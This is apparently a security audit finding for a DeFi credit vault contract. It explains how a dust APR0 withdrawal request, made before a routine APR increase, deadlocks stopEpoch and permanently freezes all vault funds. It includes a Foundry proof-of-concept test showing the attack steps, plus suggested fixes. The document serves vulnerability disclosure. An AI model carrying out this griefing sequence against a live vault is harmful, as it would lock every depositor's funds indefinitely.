### Title
Permanent `stopEpoch` freeze via dust APR0 withdrawal receipt before an APR increase - ([File: contracts/strategies/idle/IdleCreditVault.sol](contracts/strategies/idle/IdleCreditVault.sol))

### Summary
`IdleCreditVault.prepareStopEpochWithApr0` unconditionally reverts when `apr0TotalPrincipal != 0` and `unscaledApr != 0`. An unprivileged KYC'd lender can open a dust-sized withdrawal request while the pool's `unscaledApr == 0` (a legitimate "APR0" epoch configuration). If the honest manager later raises the APR — a routine operation performed via `setAprs`/`setAprsWithBuffer` — `stopEpoch` reverts forever, and the receipt can never be cleared because claiming requires `epochNumber` to advance, which only a successful `stopEpoch` can do. All LP funds are permanently locked mid-epoch.

### Finding Description
- `IdleCDOEpochVariant._stopEpoch` calls `_strategy.prepareStopEpochWithApr0(_interest)` before any state transition [1](#0-0) .
- In `prepareStopEpochWithApr0`, after the fast path, any nonzero `apr0TotalPrincipal` combined with `unscaledApr != 0` reverts `NotAllowed` [2](#0-1) .
- `apr0TotalPrincipal` is only zeroed inside `prepareStopEpochWithApr0` itself (line 540), which is unreachable once the revert condition holds [3](#0-2) .
- A user's APR0 bucket (`apr0Users[user].principal`) is only moved to `settledPrincipal` by `_settleApr0`, which returns early while `principalEpoch >= epochNumber` [4](#0-3) . `epochNumber` increments only inside `deposit()` during a successful `stopEpoch` [5](#0-4) .
- `claimWithdrawRequest` → `_claimFundedWithdrawRequest` reverts while `epochNumber <= lastWithdrawRequest[user]` [6](#0-5) .
- Result: a self-referential deadlock — the bucket can only be closed by `stopEpoch`, but `stopEpoch` cannot run while the bucket is open under a nonzero APR. The test `testApr0...` at `test/foundry/IdleCreditVault.t.sol:3331-3338` already demonstrates `stopEpoch` reverting after `setAprs(1e18, 1e18)` with an open APR0 request; the tests do not cover that the revert is unrecoverable.
- The attacker only needs to call `CDO.requestWithdraw(1 wei-equivalent, AATranche)` during a buffer period where `unscaledApr == 0` — this routes to `_requestWithdrawApr0`, setting `apr0TotalPrincipal` and `lastWithdrawRequest[user] = epochNumber` [7](#0-6) . Any later legitimate APR increase by the manager bricks the epoch state machine.

### Impact Explanation
Permanent freezing of all funds in the vault. Once the revert condition is met, `isEpochRunning` can never become false: deposits stay paused (`_pause()` at `startEpoch`), withdrawal requests stay disabled, `collectWithdrawFunds` never runs so prior pending receipts are never funded, and `restoreOperations` returns early while `isEpochRunning` [8](#0-7) . The entire TVL (all AA/BB tranche holders' principal and yield) is locked indefinitely with no admin escape — `emergencyShutdown`/`restoreOperations` cannot unstuck `apr0TotalPrincipal`, and there is no privileged function to clear APR0 buckets. Loss magnitude = 100% of vault TVL at time of freeze.

### Likelihood Explanation
Low-to-medium. It requires the pool to be configured with `unscaledApr == 0` for at least one buffer period (so an APR0 receipt can exist) and the manager to subsequently raise the APR — both are intended, non-malicious operational configurations (the APR0 flow exists precisely to support zero-APR epochs, and changing APR between epochs is the normal `stopEpoch`/`setAprs` flow). The attacker transaction itself is a dust `requestWithdraw` costing ~1 unit of underlying. No timing race is needed; the poisoned state persists until any APR increase occurs.

### Recommendation
In `prepareStopEpochWithApr0`, do not revert when `unscaledApr != 0`. Instead, settle the open bucket deterministically — e.g., treat APR0 principal as receiving zero net interest for the epoch (`apr0RateByEpoch[epochNumber] = 0`, move `apr0TotalPrincipal` accounting forward, keep `pendingWithdraws` for principal only) — and let `_settleApr0` resolve each user on claim. Alternatively, allow requesters to cancel their APR0 receipt (burning their minted strategy tokens back to the CDO) so the global bucket can drain without `epochNumber` advancing. At minimum, gate the APR increase: revert `setAprs`/`setAprsWithBuffer` when `apr0TotalPrincipal != 0` so the deadlock state is unreachable.

### Proof of Concept
Foundry fork PoC sketch (mirroring `test/foundry/IdleCreditVault.t.sol` helpers `_startEpochAndCheckPrices`, `_forceLastEpochAprToZero`):

```solidity
function testApr0DustReceiptPermanentlyBricksStopEpoch() external {
    uint256 amount = 10_000 * ONE_SCALE;

    // 1. Pool running at APR = 0 (legitimate APR0 mode)
    vm.prank(manager);
    IdleCreditVault(address(strategy)).setAprs(0, 0);

    idleCDO.depositAA(amount);
    _startEpochAndCheckPrices(0);

    // close epoch 0 at APR 0
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    // 2. Attacker (any KYC'd lender) opens a DUST APR0 withdraw request
    address attacker = makeAddr("apr0-griefer");
    deal(defaultUnderlying, attacker, 1e6);
    vm.startPrank(attacker);
    IERC20Detailed(defaultUnderlying).approve(address(idleCDO), 1e6);
    idleCDO.depositAA(1e6);
    cdoEpoch.requestWithdraw(1, cdoEpoch.AATranche()); // dust receipt → apr0TotalPrincipal = 1
    vm.stopPrank();

    assertGt(IdleCreditVault(address(strategy)).apr0TotalPrincipal(), 0);

    // 3. Honest manager raises APR for the next epoch (routine operation)
    vm.prank(manager);
    IdleCreditVault(address(strategy)).setAprs(10e18, 10e18);

    // 4. Start + attempt to stop the epoch: stopEpoch reverts
    vm.prank(manager);
    cdoEpoch.startEpoch();
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    vm.expectRevert(abi.encodeWithSelector(NotAllowed.selector));
    cdoEpoch.stopEpoch(10e18, 0);

    // 5. Attacker tries to unbrick by claiming: also reverts
    //    (epochNumber <= lastWithdrawRequest[attacker])
    vm.prank(attacker);
    vm.expectRevert(abi.encodeWithSelector(NotAllowed.selector));
    cdoEpoch.claimWithdrawRequest();

    // 6. No privileged escape: new requests only grow the bucket,
    //    restoreOperations early-returns while isEpochRunning.
    //    → All TVL permanently frozen mid-epoch.
    assertTrue(cdoEpoch.isEpochRunning());
}
```

The deadlock invariant: `apr0TotalPrincipal > 0` clears only in `prepareStopEpochWithApr0` (unreachable due to the line-507 revert) or per-user via `_settleApr0` (requires `epochNumber` to increment, which requires the same `stopEpoch`). Neither the attacker, other users, nor honest privileged roles can break the cycle.

### Citations

**File:** contracts/IdleCDOEpochVariant.sol (L360-364)
```text
    uint256 _expectedInterest;
    // Strategy finalizes APR0 bucket state and returns adjusted stopEpoch values.
    (_expectedInterest, _pendingWithdrawFees) = _strategy.prepareStopEpochWithApr0(_interest);
    // Pending withdraws may be increased during APR0 settlement, so read after prepareStopEpochWithApr0.
    uint256 _pendingWithdraws = _strategy.pendingWithdraws();
```

**File:** contracts/IdleCDOEpochVariant.sol (L624-632)
```text
    // During an epoch ordinary deposits and withdrawal requests must remain disabled. Clearing
    // the emergency flag intentionally restores only the dedicated depositDuringEpoch path.
    if (isEpochRunning) return;
    if (paused()) {
      _unpause();
    }
    allowAAWithdrawRequest = true;
    allowBBWithdrawRequest = true;
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L282-294)
```text
    lastWithdrawRequest[_user] = currentEpoch;
    // APR=0 requests keep separate accounting and settle interest at stopEpoch.
    // `_amount` here is the post-management-fee principal bucket for that flow.
    if (unscaledApr == 0 && !isClosed) {
      _requestWithdrawApr0(_amount, _user);
    } else {
      // increase the withdraw requests for the user
      // we record both per-user (old, kept for compatibility) and per-epoch so
      // on finalization we can distinguish "default-epoch pending receipts"
      // from old funded receipts.
      withdrawsRequests[_user] += _amount;
      withdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L326-328)
```text
    if (IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0 && (epochNumber <= lastWithdrawRequest[_user])) {
      revert NotAllowed();
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L499-508)
```text
    uint256 _principal = apr0TotalPrincipal;

    // Fast path: no APR0 accounting needed.
    if (_principal == 0) {
      return (_expInterest, _adjPendingWithdrawFees);
    }
    // APR0 principal is only valid while APR is 0 for that request lifecycle.
    if (unscaledApr != 0) {
      revert NotAllowed();
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L539-541)
```text
    // Close current APR0 bucket so it cannot accrue again on later stopEpoch calls.
    apr0TotalPrincipal = 0;
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L551-555)
```text
    uint256 _reqEpoch = _apr0User.principalEpoch;
    // Settle only after stopEpoch bumped epochNumber (ie after one full wait epoch).
    if (_reqEpoch >= epochNumber) {
      return;
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L607-611)
```text
    if (IIdleCDOEpochVariant(idleCDO).isEpochRunning()) {
      // deposit done on stopEpoch (before setting the var to false) so we reset the counter
      totEpochDeposits = 0;
      epochNumber += 1;
    } else {
```
